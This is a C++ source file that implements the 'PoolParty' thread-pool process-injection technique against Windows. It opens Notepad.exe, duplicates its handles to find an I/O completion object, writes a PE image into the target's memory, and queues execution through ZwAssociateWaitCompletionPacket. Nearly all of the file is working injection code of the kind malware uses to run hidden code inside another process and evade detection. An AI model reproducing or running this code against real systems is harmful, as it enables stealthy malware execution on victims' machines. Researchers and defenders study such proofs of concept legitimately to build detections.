#include "Misc.hpp"
#include "Native.hpp"
#include "ThreadPool.hpp"
#include "SelfPEInject.hpp"

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

#define ProcessHandleInformation 51

HANDLE getProcHandlebyName(LPWSTR procName, DWORD* PID) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
			if (wcscmp((entry.szExeFile), procName) == 0) {
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
				hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, *PID);
				if (!hProc) { continue; }
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

	return NULL;

}

int main() {
	
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	LPHANDLE pDuplicateHandle = new HANDLE;
	DWORD PID = 0;
	HANDLE hProc = getProcHandlebyName((LPWSTR)L"Notepad.exe", &PID);
	if (!hProc) {
		DEBUG("[x] Cannot open the process\n");
		return -1;
	}

	NTSTATUS ntStatus;
	vector<BYTE> information;
	ULONG returnLength = 0;
	do {
		information.resize(returnLength);
		ntStatus =
			NtQueryInformationProcess(
				hProc,
				static_cast<PROCESSINFOCLASS>(ProcessHandleInformation),
				information.data(),
				returnLength,
				&returnLength
			);
		//STATUS_INFO_LENGTH_MISMATCH
	} while (ntStatus == 0xC0000004);

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());

	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
		if (!DuplicateHandle(
			hProc,
			pProcessInformation->Handles[i].HandleValue,
			GetCurrentProcess(),
			pDuplicateHandle,
			IO_COMPLETION_ALL_ACCESS,
			FALSE,
			NULL
		)) {
			DEBUG("DuplicateHandle Failded %d\n", GetLastError());
			continue;
			//return -1; //return with failed in windows 11
		}


		vector<BYTE> object;
		returnLength = 0;
		do {
			object.resize(returnLength);
			ntStatus =
				NtQueryObject(
					*pDuplicateHandle,
					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
					object.data(),
					returnLength,
					&returnLength);
		} while (ntStatus == 0xC0000004);
		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
		
		if (wstring(pObjectInformation->TypeName.Buffer) == L"IoCompletion") {
			break;
		}
	}

	LPVOID OEP = WritePEToTarget(hProc);

	SIZE_T byteWritten;
	const auto pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait(static_cast<PTP_WAIT_CALLBACK>(OEP), nullptr, nullptr);
	if (pTpWait == NULL) {
		DEBUG("CreateThreadpoolWait: %d", GetLastError());
		return -1;
	}

	const auto pRemoteTpWait = static_cast<PFULL_TP_WAIT>(VirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	WriteProcessMemory(hProc, pRemoteTpWait, pTpWait, sizeof(FULL_TP_WAIT), &byteWritten);
	
	const auto pRemoteTpDirect = static_cast<PTP_DIRECT>(VirtualAllocEx(hProc, nullptr, sizeof(PTP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	WriteProcessMemory(hProc, pRemoteTpDirect, &pTpWait->Direct, sizeof(TP_DIRECT), &byteWritten);
	HANDLE hEvent = CreateEvent(nullptr, FALSE, FALSE, const_cast<LPWSTR>(L"PoolPartyEvent"));
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		std::printf("WARNING: The event already exists: PoolPartyEvent\n");
	}
	
	ZwAssociateWaitCompletionPacketPtr ZwAssociateWaitCompletionPacketfn = (ZwAssociateWaitCompletionPacketPtr)GetProcAddress(hNtdll, "ZwAssociateWaitCompletionPacket");
	if (!ZwAssociateWaitCompletionPacketfn) {
		DEBUG("Failed get address of ZwAssociateWaitCompletionPacket\n");
		return -1;
	}

	ntStatus = ZwAssociateWaitCompletionPacketfn(pTpWait->WaitPkt, *pDuplicateHandle, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, nullptr);
	if (!NT_SUCCESS(ntStatus)) {
		DEBUG("[x] Failed to ZwAssociateWaitCompletionPacketfn : %p \n", ntStatus);
		return -1;
	}

	if (!SetEvent(hEvent)) {
		DEBUG("[x] Failed to GetLastError : %p \n", GetLastError());
	}
}